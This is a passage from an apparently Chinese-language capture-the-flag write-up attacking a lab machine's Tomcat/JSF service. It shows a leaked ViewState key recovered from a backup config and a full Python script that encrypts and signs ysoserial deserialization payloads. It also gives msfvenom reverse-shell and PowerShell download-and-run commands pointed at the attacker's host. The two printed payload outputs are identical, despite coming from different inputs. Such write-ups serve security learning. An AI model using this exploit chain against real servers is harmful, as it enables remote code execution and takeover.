<br>┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8/lost+found]<br>└─<span class="hljs-comment"># ls -al </span><br>总用量 13<br>drwx------ 2 root root 12288 12月 25  2018 .<br>drwxr-xr-x 4 root root  1024 12月 25  2018 ..<br>                                                                   <br></code></pre></td></tr></table></figure><p>还有一堆图片、文档、PDF等：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8]<br>└─<span class="hljs-comment"># ls   </span><br>lost+found  Mask<br>                                                                                                                                                          <br>┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8]<br>└─<span class="hljs-comment"># cd Mask </span><br>                                                                                                                                                          <br>┌──(root㉿Android)-[/media/worldisend/af474e94-894e-4bb6-897a-adc82884b3d8/Mask]<br>└─<span class="hljs-comment"># ls</span><br>docs  joker.png  me.jpg  mycar.jpg  robin.jpeg  tomcat-stuff<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411145226448.png" alt="image-20220411145226448" /><p>PDF是一些漫画桥段：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONTINUED: (2)<br>2.<br>RACHEL<br>Bruce, I can see you.<br>Young Bruce suppresses a giggle- the BOARDS beneath him GIVE<br>WAY and he PLUMMETS into...<br>3<br>INT. OLD WELL -- CONTINUOUS<br>3<br>Young Bruce DROPS thirty feet- LANDS painfully on the rubble<br>strewn bottom of the shaft.<br>4<br>EXT. KITCHEN GARDEN, WAYNE MANOR -- CONTINUOUS<br>4<br></code></pre></td></tr></table></figure><p>镜像中还有一个tomcat-stuff目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># ls</span><br>context.xml  faces-config.xml  jaspic-providers.xml  MANIFEST.MF  server.xml  tomcat-users.xml  web.xml  web.xml.bak<br></code></pre></td></tr></table></figure><p>说实话，单看配置文件我还看不懂，因为我还没有与目标HTTP服务进行访问探索。80端口只是一个IIS默认页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411150030488.png" alt="image-20220411150030488"  /><p>也没什么目录信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─<span class="hljs-comment"># dirsearch -u http://10.10.10.130/</span><br><br>  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                          <br> (_||| _) (/_(_|| (_| )                                                                                                                                   <br>                                                                                                                                                          <br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927<br><br>Output File: /root/.dirsearch/reports/10.10.10.130/-_22-04-11_14-59-22.txt<br><br>Error Log: /root/.dirsearch/logs/errors-22-04-11_14-59-22.<span class="hljs-built_in">log</span><br><br>Target: http://10.10.10.130/<br><br>[14:59:23] Starting: <br>[14:59:25] 403 -  312B  - /%2e%2e//google.com                              <br>[14:59:37] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           <br>                                                                             <br>Task Completed         <br></code></pre></td></tr></table></figure><p>相比之下8080端口，哇简直炫酷无比：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411150236662.png" alt="image-20220411150236662" /><p>Mask，看来我在镜像中看到的目录应该是这个站点的备份了。好吧，页面看着炫酷其实让我通过点击去与目标服务器交互的请求按钮就一个，其他都是在当前页面锚点反复横跳。能够让我点击的按钮只有subscription，也就是订阅，点击之后会是这样一个页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411154800565.png" alt="image-20220411154800565" /><h2 id="User-txt"><a href="#User-txt" class="headerlink" title="User.txt"></a>User.txt</h2><p>我在检查元素中发现了一些信息：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411154908526.png" alt="image-20220411154908526" /><p>这看起来像是一个名词。先随便输一下，我想知道它提交给了后端的谁：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/userSubscribe.faces</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>259<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://10.10.10.130:8080<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://10.10.10.130:8080/userSubscribe.faces<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=14DF1E00535DE781B7B65316C4D3C1EC<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-apache"><span class="hljs-attribute">j_id_jsp_1623871077_1</span>%<span class="hljs-number">3</span>Aemail=sdasda&amp;j_id_jsp_1623871077_1%<span class="hljs-number">3</span>Asubmit=SIGN+UP&amp;j_id_jsp_1623871077_1_SUBMIT=<span class="hljs-number">1</span>&amp;javax.faces.ViewState=wHo0wmLu5ceItIi%<span class="hljs-number">2</span>BI7XkEi1GAb4h12WZ894pA%<span class="hljs-number">2</span>BZ4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg%<span class="hljs-number">3</span>D</span><br></code></pre></td></tr></table></figure><p>好的&#x2F;userSubscribe.faces。我释放了数据包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411155423107.png" alt="image-20220411155423107" /><p>检测元素中看到的名词：javax.faces.ViewState。然后我搜到了如下信息：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://www.alphabot.com/security/blog/2017/java/Misconfigured-JSF-ViewStates-can-lead-to-severe-RCE-vulnerabilities.html<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">错误配置的 JSF ViewStates 可能导致严重的 RCE 漏洞<br>tl;博士JSF 中的 ViewStates 是序列化的 Java 对象。如果 Web 应用程序中使用的 JSF 实现未配置为对 ViewState 进行加密，则 Web 应用程序可能具有严重的remote code execution (RCE) vulnerability. 因此，永远不要禁用 ViewState 加密非常重要！<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411155833110.png" alt="image-20220411155833110" /><p>好巧不巧，我刚捕获的数据包中存在这些特征。我可以试着将我之前的数据包中的字段值base64解码一下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wHo0wmLu5ceItIi%2BI7XkEi1GAb4h12WZ894pA%2BZ4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg%3D<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411160004232.png" alt="image-20220411160004232" /><p>是乱码唉，这意味着序列化的数据可能是加密的。幸运的是，我有服务器配置文件，在镜像文件中获取到的，是时候检查它们了。在<code>web.xml.bak</code>我找到了用于加密数据的密钥，以及 MAC 算法<code>hmac-sha1</code>，SnNGOTg3Ni0&#x3D;看起来像是一个密钥。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;context-param&gt;<br>&lt;param-name&gt;org.apache.myfaces.SECRET&lt;/param-name&gt;<br>&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;<br>&lt;/context-param&gt;<br>    &lt;context-param&gt;<br>        &lt;param-name&gt;org.apache.myfaces.MAC_ALGORITHM&lt;/param-name&gt;<br>        &lt;param-value&gt;HmacSHA1&lt;/param-value&gt;<br>     &lt;/context-param&gt;<br>&lt;context-param&gt;<br>&lt;param-name&gt;org.apache.myfaces.MAC_SECRET&lt;/param-name&gt;<br>&lt;param-value&gt;SnNGOTg3Ni0=&lt;/param-value&gt;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># echo SnNGOTg3Ni0= | base64 -d</span><br>JsF9876-      <br></code></pre></td></tr></table></figure><p>然后我借用了一下<strong>0xRick</strong>的脚本。这是他的博客地址：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://0xrick.github.io/<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<br><span class="hljs-keyword">from</span> pyDes <span class="hljs-keyword">import</span> *<br><br>YELLOW = <span class="hljs-string">&quot;\033[93m&quot;</span><br>GREEN = <span class="hljs-string">&quot;\033[32m&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">payload,key</span>):<br>cipher = des(key, ECB, IV=<span class="hljs-literal">None</span>, pad=<span class="hljs-literal">None</span>, padmode=PAD_PKCS5)<br>enc_payload = cipher.encrypt(payload)<br><span class="hljs-keyword">return</span> enc_payload<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hmac_sig</span>(<span class="hljs-params">enc_payload,key</span>):<br>hmac_sig = hmac.new(key, enc_payload, sha1)<br>hmac_sig = hmac_sig.digest()<br><span class="hljs-keyword">return</span> hmac_sig<br><br>key = <span class="hljs-string">b&#x27;JsF9876-&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">3</span> :<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;[!] Usage : &#123;&#125; [Payload File] [Output File]&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">0</span>]))<br><span class="hljs-keyword">else</span>:<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>payload = f.read()<br>f.close()<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;[+] Encrypting payload&quot;</span>)<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;  [!] Key : JsF9876-\n&quot;</span>)<br>enc_payload = encrypt(payload,key)<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;[+] Creating HMAC signature&quot;</span>)<br>hmac_sig = hmac_sig(enc_payload,key)<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;[+] Appending signature to the encrypted payload\n&quot;</span>)<br>payload = b64encode(enc_payload + hmac_sig)<br>payload = parse.quote_plus(payload)<br><span class="hljs-built_in">print</span>(YELLOW + <span class="hljs-string">&quot;[*] Final payload : &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(payload))<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(sys.argv[<span class="hljs-number">2</span>], <span class="hljs-string">&quot;w&quot;</span>) <span class="hljs-keyword">as</span> f:<br>f.write(payload)<br>f.close()<br><span class="hljs-built_in">print</span>(GREEN + <span class="hljs-string">&quot;[*] Saved to : &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(sys.argv[<span class="hljs-number">2</span>]))<br></code></pre></td></tr></table></figure><p>还有Java反序列化载荷生成工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://github.com/frohoff/ysoserial<br></code></pre></td></tr></table></figure><p>该脚本有两个函数，<code>**encrypt()**</code>和<code>**hmac_sig()**</code>，<code>**encrypt()**</code>获取由生成的有效负载<code>**ysoserial**</code>并<code>DES</code>使用密钥对其进行加密，然后返回加密的有效负载。<code>**hmac_sig()**</code>获取加密的有效负载并生成<code>hmac</code>将附加到加密有效负载的签名。<br>该脚本有两个参数，第一个是包含<code>ysoserial</code>生成的有效负载的文件名，它对其进行加密然后生成<code>hmac</code>签名，将其附加到加密的有效负载，base-64 编码最终的有效负载并<code>url</code>对其进行编码。然后它将有效负载保存到作为第二个参数的输出文件中。<br>是时候使用了<code>ysoserial</code>，我遇到了使用哪个有效载荷的问题，我使用<code>CommonsCollections5</code>并且它有效。</p><p>首先我要生成一个Metasploit载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.5 LPORT=4444 -f exe &gt; shell.exe<br></code></pre></td></tr></table></figure><p>然后启动一个http服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 80    <br>Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...<br></code></pre></td></tr></table></figure><p>然后通过ysoserial.jar生成载荷让其下载我的载荷并保存到我指定的路径中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;cmd.exe /c powershell -c Invoke-WebRequest -Uri &quot;http://10.10.16.5/shell.exe&quot; -OutFile &quot;C:\windows\system32\spool\drivers\color\shell.exe&quot;&#x27;</span> &gt; uploadnc.payload<br></code></pre></td></tr></table></figure><p>第二个载荷让其运行我的Metasploit载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsCollections5 <span class="hljs-string">&#x27;cmd.exe /c &quot;C:\windows\system32\spool\drivers\color\shell.exe&quot;&#x27;</span> &gt; executenc.payload<br></code></pre></td></tr></table></figure><p>使用脚本加密第一个载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">./JSF.payload.py uploadnc.payload uploadnc.final<br>[+] Encrypting payload<br>  [!] Key : JsF9876-                                                                                                                                                                           <br>                                                                                                                                                                                               <br>[+] Creating HMAC signature                                                                                                                                                                    <br>[+] Appending signature to the encrypted payload                                                                                                                                               <br>                                                                                                                                                                                               <br>[*] Final payload : o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2OzpqLZ5YnNLaBNtP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy2li76ST4pm%2FNwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRSCqpLgwWr7iPgQijAFFrHWRvjlEtsVNbr09Qek%2F0QE3yWXS1W%2FgaT%2B7VnbdN2xAhE%2B9N5PSzJudEi8q%2Fo29VPYR09wsfhAuTjrYlMSGjWS43oZdevt%2FJEZXec0tNZrLt07KWfRy5V9yjRz4pX51hJncMb%2FlkFDDwY6Vgyqsv%2Fv0cwjxzM5zfWrA5jMlxTth6AwOM7psVk8Pd5cGgz2UfJf5vpwOMDCtiNrN%2B27NclIvTaMDSakBZ9sP%2B9S2CS1mQ3zj99dpfX2mEsPltRh0zthb5cctors4okX%2FtQwY9s8lwaC0UEW3b5naNWhl1XI21cPXzOVxSrlQAc3ZWesNNhQHYhQvw4tg%2Fq3UdXN46uZl8BqpHZTh0KboPoJID1kt23OdjgAc57e5b731L0DIUFoIJ3oeMQ6PBqvwh3IvbaEFuVQlSOQeVxGTIhHemtjgQ14bs93nfp6TWfKLWrcXhhfUwAKg%3D%3D<br>                                             <br>                                                                                                                                                                                               <br>[*] Saved to : executenc.final <br></code></pre></td></tr></table></figure><p>使用脚本加密第二个载荷：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">./JSF.payload.py executenc.payload executenc.final   <br>[+] Encrypting payload<br>  [!] Key : JsF9876-<br>                                                                                                                                                                                               <br>[+] Creating HMAC signature                                                                                                                                                                    <br>[+] Appending signature to the encrypted payload                                                                                                                                               <br>                                                                                                                                                                                               <br>[*] Final payload : o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2OzpqLZ5YnNLaBNtP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy2li76ST4pm%2FNwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m